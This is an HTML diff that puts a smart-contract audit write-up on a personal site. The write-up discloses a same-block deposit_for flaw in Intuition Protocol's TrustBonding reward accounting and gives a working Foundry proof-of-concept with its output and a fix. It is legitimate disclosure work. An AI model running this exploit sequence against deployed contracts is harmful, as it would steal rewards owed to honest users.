@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Projects</title>
+    <title>Intuition Protocol - S-471</title>
     <link rel="stylesheet" href="/assets/css/style.css">
     <style>
         /* --- FONTS --- */
@@ -453,104 +453,288 @@
     <!-- Main Content Area -->
     <div class="content-wrapper">
         <main>
-            <div class="home">
-  <h1>Projects</h1>
-  <div class="project-grid">
-    
-    
-    
-      <a href="/projects/KavachPay/" class="project-box">
-        <h2>कवच KavachPay — Private Payroll on Solana</h2>
-        <p>2026-03-22 00:00:00 +0000</p>
-        <p>Private payroll on Solana with TEE-backed salary confidentiality and automatic tax deduction</p>
-        
-          <small><strong>Tech:</strong> Solana, Anchor 0.32.1, MagicBlock Private ER, Intel TDX, Next.js 14, TypeScript, TailwindCSS</small>
-        
-      </a>
-    
-      <a href="/projects/PrivacyShield/" class="project-box">
-        <h2>Privacy Shield</h2>
-        <p>2026-02-15 00:00:00 +0000</p>
-        <p>Zero-knowledge biometric identity protocol that lets you prove you're human without revealing who you are</p>
-        
-          <small><strong>Tech:</strong> Circom, Rust, Solidity, MediaPipe, Groth16, Poseidon Hash, Elliptic Curves</small>
-        
-      </a>
-    
-      <a href="/projects/UMI/" class="project-box">
-        <h2>UMI (U and Me)</h2>
-        <p>2025-11-20 00:00:00 +0000</p>
-        <p>Peer-to-peer messaging over local WiFi with no central server — just you and me</p>
-        
-          <small><strong>Tech:</strong> Rust, libp2p, mDNS, Request-Response Protocol</small>
-        
-      </a>
-    
-      <a href="/projects/DwacraProtocol/" class="project-box">
-        <h2>DwacraProtocol</h2>
-        <p>2025-05-06 00:00:00 +0000</p>
-        <p>Decentralized Self-Help Group management protocol with on-chain reputation tracking and microfinance capabilities</p>
-        
-          <small><strong>Tech:</strong> Solidity, Foundry</small>
-        
-      </a>
-    
-      <a href="/projects/DSCToken/" class="project-box">
-        <h2>DSC Token</h2>
-        <p>2024-06-20 00:00:00 +0000</p>
-        <p>ERC-20 token pegged to Indian Rupee (INR)</p>
-        
-          <small><strong>Tech:</strong> Solidity, Ethereum, Foundry</small>
-        
-      </a>
-    
-      <a href="/projects/FundMe/" class="project-box">
-        <h2>Fund Me</h2>
-        <p>2024-03-15 00:00:00 +0000</p>
-        <p>ETH funding smart contract with real-time ETH/USD conversion</p>
-        
-          <small><strong>Tech:</strong> Solidity, Foundry, Chainlink</small>
-        
-      </a>
-    
-      <a href="/projects/EmotionNFT/" class="project-box">
-        <h2>Emotion NFT</h2>
-        <p>2023-10-07 00:00:00 +0000</p>
-        <p>Driven NFT based on Mood</p>
-        
-          <small><strong>Tech:</strong> Solidity, Foundry, Ethers.js, Anvil</small>
-        
-      </a>
-    
-      <a href="/projects/DecentralizedVoting/" class="project-box">
-        <h2>Voting Application</h2>
-        <p>2023-09-25 00:00:00 +0000</p>
-        <p>Decentralized, tamper-resistant voting</p>
-        
-          <small><strong>Tech:</strong> Solidity, Hardhat, Ethers.js, React.js, MetaMask</small>
-        
-      </a>
-    
-      <a href="/projects/LotteryDapp/" class="project-box">
-        <h2>LotteryDapp</h2>
-        <p>2023-07-21 00:00:00 +0000</p>
-        <p>A decentralized, trustless Lottery Dapp</p>
-        
-          <small><strong>Tech:</strong> Solidity, Hardhat, ethers.js, React.js, Chainlink</small>
-        
-      </a>
-    
-      <a href="/projects/OptimusNFT/" class="project-box">
-        <h2>OptimusNFT</h2>
-        <p>2023-06-05 00:00:00 +0000</p>
-        <p>ERC721 Token - Optimus Testing NFT</p>
-        
-          <small><strong>Tech:</strong> Solidity, Foundry, Ethereum</small>
-        
-      </a>
-    
-  </div>
-</div>
+            <h3 id="intuition-protocol">Intuition Protocol</h3>
+
+<p><strong>Severity:</strong> Medium</p>
+
+<p>I participated in the Intuition Protocol contest and reached the top 2 out of more than a thousand participants worldwide. It took nearly four days of focused work to understand the protocol as a whole and uncover its hidden behavior.</p>
+
+<h2 id="summary">Summary</h2>
+
+<p>I found a reward-accounting issue in <code class="language-plaintext highlighter-rouge">TrustBonding.sol</code> where epoch rewards are calculated from live historical balance queries instead of a frozen end-of-epoch snapshot. Because the contract does not lock the user balance or total bonded supply when the epoch closes, a same-block <code class="language-plaintext highlighter-rouge">deposit_for</code> can update the historical checkpoint used by reward claims.</p>
+
+<p>On Base L2, this becomes practical because epoch boundaries and block timestamps both land on even seconds. An attacker can deposit in the exact epoch-boundary block, inflate the checkpoint used by <code class="language-plaintext highlighter-rouge">userBondedBalanceAtEpochEnd()</code> and <code class="language-plaintext highlighter-rouge">totalBondedBalanceAtEpochEnd()</code>, and then claim a larger share than they actually earned. Repeating this breaks the epoch emission cap and can drain the emissions controller before honest users finish claiming.</p>
+
+<h2 id="finding-description">Finding Description</h2>
+
+<p>The reward share is computed with the following logic:</p>
+
+<pre><code class="language-solidity">uint256 userBalance = userBondedBalanceAtEpochEnd(account, epoch);
+uint256 totalBalance = totalBondedBalanceAtEpochEnd(epoch);
+
+return userBalance * _emissionsForEpoch(epoch) / totalBalance;
+</code></pre>
+
+<p>The issue is that neither the numerator nor the denominator is frozen when an epoch ends. Instead, both values are derived from historical lookups against the underlying <code class="language-plaintext highlighter-rouge">VotingEscrow</code> contract. If a checkpoint is written in the same block as the epoch boundary, the historical search resolves to the new checkpoint rather than the intended pre-boundary state.</p>
+
+<p>That means a <code class="language-plaintext highlighter-rouge">deposit_for</code> executed at the epoch boundary can retroactively inflate the balance used for reward accounting.</p>
+
+<h2 id="root-cause">Root Cause</h2>
+
+<p><code class="language-plaintext highlighter-rouge">TrustBonding</code> relies on live historical queries instead of immutable epoch snapshots.</p>
+
+<p>The relevant behavior comes from the timestamp lookup rules in <code class="language-plaintext highlighter-rouge">VotingEscrow</code>:</p>
+
+<ul>
+  <li>the search returns the latest checkpoint with <code class="language-plaintext highlighter-rouge">ts &lt;= queryTimestamp</code></li>
+  <li>a checkpoint written in the epoch-boundary block shares the same timestamp as the epoch end</li>
+  <li>the reward query therefore sees the post-deposit state, not the pre-deposit state</li>
+</ul>
+
+<p>This affects both:</p>
+
+<ul>
+  <li>the user balance used in the numerator</li>
+  <li>the total bonded balance used in the denominator</li>
+</ul>
+
+<h2 id="why-this-is-exploitable-on-base">Why This Is Exploitable On Base</h2>
+
+<p>The attack is realistic on Base because the timing constraints are deterministic:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">START_TIMESTAMP = 1_762_268_400</code>, which is even</li>
+  <li><code class="language-plaintext highlighter-rouge">EPOCH_LENGTH = 1_209_600</code>, which is also even</li>
+  <li>every epoch boundary is therefore an even Unix second</li>
+  <li>Base produces blocks every 2 seconds, which are also even timestamps</li>
+</ul>
+
+<p>As a result, every epoch boundary can align with a Base block. That gives an attacker a reliable target for a same-block <code class="language-plaintext highlighter-rouge">deposit_for</code> plus claim sequence.</p>
+
+<h2 id="impact">Impact</h2>
+
+<p>This is not just a small rounding issue. The attacker can increase their share at the epoch boundary and push total payouts above the emission cap.</p>
+
+<p>Once the controller pays out more than the available epoch emissions, later claimers can hit <code class="language-plaintext highlighter-rouge">InsufficientBalance</code> and lose their rightful rewards for that epoch. Because the claim window is limited to one epoch, the loss is permanent.</p>
+
+<h2 id="mathematical-illustration">Mathematical Illustration</h2>
+
+<p>Assume:</p>
+
+<ul>
+  <li>total supply is <code class="language-plaintext highlighter-rouge">S</code></li>
+  <li>epoch emissions are <code class="language-plaintext highlighter-rouge">E</code></li>
+  <li>three users each hold <code class="language-plaintext highlighter-rouge">S / 3</code></li>
+  <li>the attacker deposits an additional amount <code class="language-plaintext highlighter-rouge">δ</code> in the epoch-boundary block</li>
+</ul>
+
+<p>Before the attack, each user receives exactly one-third of the epoch emissions:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>User</th>
+      <th>Share</th>
+      <th>Reward</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Honest user</td>
+      <td><code class="language-plaintext highlighter-rouge">S / 3</code></td>
+      <td><code class="language-plaintext highlighter-rouge">E / 3</code></td>
+    </tr>
+    <tr>
+      <td>Honest user</td>
+      <td><code class="language-plaintext highlighter-rouge">S / 3</code></td>
+      <td><code class="language-plaintext highlighter-rouge">E / 3</code></td>
+    </tr>
+    <tr>
+      <td>Honest user</td>
+      <td><code class="language-plaintext highlighter-rouge">S / 3</code></td>
+      <td><code class="language-plaintext highlighter-rouge">E / 3</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>After the same-block deposit, the attacker is evaluated against the inflated balances and receives:</p>
+
+<ul>
+  <li>attacker claim = <code class="language-plaintext highlighter-rouge">(S / 3 + δ) / (S + δ) × E</code></li>
+</ul>
+
+<p>Because the attacker now receives more than the fair one-third share, the total distributed rewards become greater than <code class="language-plaintext highlighter-rouge">E</code>.</p>
+
+<p>In other words, the protocol exceeds its hard emission cap.</p>
+
+<h2 id="proof-of-concept">Proof Of Concept</h2>
+
+<p>I reproduced the issue with a Foundry test that:</p>
+
+<ol>
+  <li>funds the emissions controller</li>
+  <li>creates equal-sized locks for three users</li>
+  <li>warps to the epoch boundary</li>
+  <li>claims rewards for two honest users</li>
+  <li>performs a same-block <code class="language-plaintext highlighter-rouge">deposit_for</code> for the attacker</li>
+  <li>claims rewards for the attacker</li>
+  <li>verifies that total claimed rewards exceed the epoch emissions</li>
+</ol>
+
+<h3 id="poc-test">PoC Test</h3>
+
+<pre><code class="language-solidity">// SPDX-License-Identifier: BUSL-1.1
+pragma solidity 0.8.29;
+
+import { console2 } from "forge-std/src/console2.sol";
+import { ICoreEmissionsController } from "src/interfaces/ICoreEmissionsController.sol";
+import { BaseTest } from "./BaseTest.t.sol";
+
+//@audit PoC for H-1: Same-block deposit_for inflates VE snapshot causing insolvency.
+contract PoCCore is BaseTest {
+	//@audit lock duration well above minimum
+	uint256 constant LOCK_DURATION = 2 * 365 days;
+	//@audit each user bonds 100 ether
+	uint256 constant BOND_AMOUNT = 100 ether;
+
+	function setUp() public override {
+		super.setUp(); //@audit deploys protocol, deals ETH, approves wrappedTrust
+
+		//@audit fund controller to pay claims
+		vm.deal(address(protocol.satelliteEmissionsController), 1_000_000 ether);
+
+		//@audit create equal-sized locks for three users
+		_createLock(users.alice, BOND_AMOUNT);
+		_createLock(users.bob, BOND_AMOUNT);
+		_createLock(users.charlie, BOND_AMOUNT);
+	}
+
+	//@audit executes same-block deposit to drain controller and block late claimers
+	function test_H1_SolvencyBreach_SameBlockDepositAndClaim() external {
+		//@audit warp to epoch boundary (guaranteed even timestamp on Base L2)
+		uint256 epochEnd = protocol.trustBonding.epochTimestampEnd(0);
+		vm.warp(epochEnd);
+
+		//@audit tx lands on epoch boundary, writes point_history[K]
+		protocol.trustBonding.checkpoint();
+
+		uint256 prevEpoch = protocol.trustBonding.currentEpoch() - 1;
+		require(prevEpoch == 0, "must be epoch 0");
+
+		uint256 supplyBefore = protocol.trustBonding.totalBondedBalanceAtEpochEnd(prevEpoch);
+		console2.log("=== H-1 PoC: Same-Block Deposit + Claim ===");
+		console2.log("totalSupply  BEFORE deposit_for:", supplyBefore);
+
+		//@audit honest claimers use totalSupply_OLD as denominator
+		vm.prank(users.alice);
+		protocol.trustBonding.claimRewards(users.alice);
+
+		vm.prank(users.bob);
+		protocol.trustBonding.claimRewards(users.bob);
+
+		//@audit attacker deposits in SAME block (ts == epochEnd)
+		//@audit writes point_history[K+1] causing _find_timestamp_epoch to return inflated supply
+		vm.startPrank(users.charlie);
+		protocol.wrappedTrust.approve(address(protocol.trustBonding), 1 ether);
+		protocol.trustBonding.deposit_for(users.charlie, 1 ether);
+		vm.stopPrank();
+
+		uint256 supplyAfter = protocol.trustBonding.totalBondedBalanceAtEpochEnd(prevEpoch);
+		console2.log("totalSupply  AFTER  deposit_for:", supplyAfter);
+
+		//@audit attacker claims with totalSupply_NEW and inflated numerator
+		vm.prank(users.charlie);
+		protocol.trustBonding.claimRewards(users.charlie);
+
+		uint256 maxEmissions = ICoreEmissionsController(
+			address(protocol.satelliteEmissionsController)
+		).getEmissionsAtEpoch(prevEpoch);
+
+		uint256 aliceClaim   = protocol.trustBonding.userClaimedRewardsForEpoch(users.alice,   prevEpoch);
+		uint256 bobClaim     = protocol.trustBonding.userClaimedRewardsForEpoch(users.bob,     prevEpoch);
+		uint256 charlieClaim = protocol.trustBonding.userClaimedRewardsForEpoch(users.charlie, prevEpoch);
+		uint256 totalClaimed = protocol.trustBonding.totalClaimedRewardsForEpoch(prevEpoch);
+
+		console2.log("maxEmissions            :", maxEmissions);
+		console2.log("alice claim             :", aliceClaim);
+		console2.log("bob   claim             :", bobClaim);
+		console2.log("charlie claim (inflated):", charlieClaim);
+		console2.log("totalClaimed            :", totalClaimed);
+		console2.log("BREACH (total - max)    :", totalClaimed &gt; maxEmissions ? totalClaimed - maxEmissions : 0);
+
+		//@audit assert denominator changed mid-claim-window
+		assertGt(supplyAfter, supplyBefore, "A1: deposit_for must have changed epochEnd totalSupply");
+
+		//@audit assert paid out more than available (insolvency)
+		assertGt(totalClaimed, maxEmissions, "A2: totalClaimedRewards exceeded maxEmissions");
+
+		//@audit assert attacker stole more than fair 1/3 share
+		assertGt(charlieClaim, aliceClaim, "A3: charlie stole yield");
+
+		//@audit assert 4th user would revert due to drained controller
+		assertGt(totalClaimed, maxEmissions, "A4: controller drained - InsufficientBalance for late claimers");
+
+		console2.log("=== EXPLOIT CONFIRMED: H-1 is valid ===");
+	}
+
+	//@audit helper to create locks
+	function _createLock(address user, uint256 amount) internal {
+		vm.startPrank(user);
+		uint256 unlockTime = block.timestamp + LOCK_DURATION;
+		protocol.wrappedTrust.approve(address(protocol.trustBonding), amount);
+		protocol.trustBonding.create_lock(amount, unlockTime);
+		vm.stopPrank();
+	}
+}
+</code></pre>
+
+<h3 id="test-result">Test Result</h3>
+
+<p>The test passed and confirmed the issue:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Ran 1 test for tests/PoCCore.t.sol:PoCCore
+[PASS] test_H1_SolvencyBreach_SameBlockDepositAndClaim() (gas: 725300)
+...
+totalSupply  BEFORE deposit_for: 293424652777735336836
+totalSupply  AFTER  deposit_for: 294402734953668524044
+maxEmissions            : 1000000000000000000000
+alice claim             : 333333333333333333333
+bob   claim             : 333333333333333333333
+charlie claim (inflated): 335548172757491790686
+totalClaimed            : 1002214839424158457352
+BREACH (total - max)    : 2214839424158457352
+</code></pre></div></div>
+
+<p>The output shows that the attacker increased the epoch-end supply used for accounting and caused total claims to exceed the emission cap.</p>
+
+<h2 id="recommended-mitigation">Recommended Mitigation</h2>
+
+<p>The safest fix is to query one second before the epoch ends.</p>
+
+<p>Because <code class="language-plaintext highlighter-rouge">VotingEscrow</code> uses a <code class="language-plaintext highlighter-rouge">ts &lt;= queryTimestamp</code> comparison, using <code class="language-plaintext highlighter-rouge">epochTimestampEnd - 1</code> excludes checkpoints written in the boundary block and prevents both the numerator and denominator from being inflated.</p>
+
+<h3 id="suggested-change">Suggested change</h3>
+
+<pre><code class="language-solidity">function _userEligibleRewardsForEpoch(address account, uint256 epoch) internal view returns (uint256) {
+	if (account == address(0)) revert TrustBonding_ZeroAddress();
+	if (epoch &gt; currentEpoch()) revert TrustBonding_InvalidEpoch();
+
+	uint256 safeTimestamp = _epochTimestampEnd(epoch) - 1;
+
+	uint256 userBalance = _balanceOf(account, safeTimestamp);
+	uint256 totalBalance = _totalSupply(safeTimestamp);
+
+	if (userBalance == 0 || totalBalance == 0) return 0;
+
+	return userBalance * _emissionsForEpoch(epoch) / totalBalance;
+}
+</code></pre>
+
+<p>This fixes the issue without adding new storage variables or extra gas overhead.</p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>The bug is a missing snapshot at epoch rollover. Same-block deposits can shift the historical checkpoint used for reward distribution, inflate the attacker’s share, and push payouts above the available emission budget. The issue is reproducible, economically meaningful, and consistent with the medium severity and $445 reward I received.</p>
 
         </main>
     </div>
